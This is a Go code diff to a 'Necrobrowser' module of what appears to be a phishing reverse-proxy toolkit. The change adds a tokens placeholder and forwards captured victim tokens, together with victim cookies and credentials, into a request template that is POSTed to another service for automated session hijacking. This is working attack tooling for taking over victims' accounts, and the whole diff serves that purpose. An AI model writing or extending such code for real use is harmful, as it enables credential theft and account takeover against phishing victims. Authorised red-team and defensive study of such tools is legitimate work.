@@ -27,6 +27,7 @@ const (
 	TrackerPlaceholder     = "%%%TRACKER%%%"
 	CookiePlaceholder      = "%%%COOKIES%%%"
 	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
+	TokensPlaceholder      = "%%%TOKENS%%%"
 )
 
 // Necrobrowser module
@@ -176,8 +177,9 @@ func (module *Necrobrowser) CheckSessionCookies() {
 				module.Debug("error marshalling %s", err)
 			}
 
-			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), cookiesFound)
-			if err := module.Instrument(v.ID, v.Cookies, string(j)); err == nil {
+			module.Info("instrumenting %s using %d cookies, %d tokens",
+				tui.Bold(tui.Red(v.ID)), cookiesFound, len(v.Tokens))
+			if err := module.Instrument(v.ID, v.Cookies, v.Tokens, string(j)); err == nil {
 				// only mark as instrumented when the POST actually succeeded
 				_ = db.SetSessionAsInstrumented(v.ID)
 			}
@@ -194,7 +196,7 @@ func Contains(slice *[]string, find string) bool {
 	return false
 }
 
-func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) error {
+func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, tokens []db.VictimToken, credentialsJSON string) error {
 	var necroCookies []SessionCookie
 	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
 
@@ -226,10 +228,17 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 		return err
 	}
 
+	t, err := json.MarshalIndent(tokens, "", "\t")
+	if err != nil {
+		module.Warning("Error marshalling the tokens: %s", err)
+		t = []byte("[]")
+	}
+
 	newRequest := module.RequestTemplate
 	newRequest = strings.ReplaceAll(newRequest, TrackerPlaceholder, victimID)
 	newRequest = strings.ReplaceAll(newRequest, CookiePlaceholder, string(c))
 	newRequest = strings.ReplaceAll(newRequest, CredentialsPlaceholder, credentialsJSON)
+	newRequest = strings.ReplaceAll(newRequest, TokensPlaceholder, string(t))
 
 	module.Info("instrumenting %s", tui.Bold(tui.Red(victimID)))
 	client := resty.New()
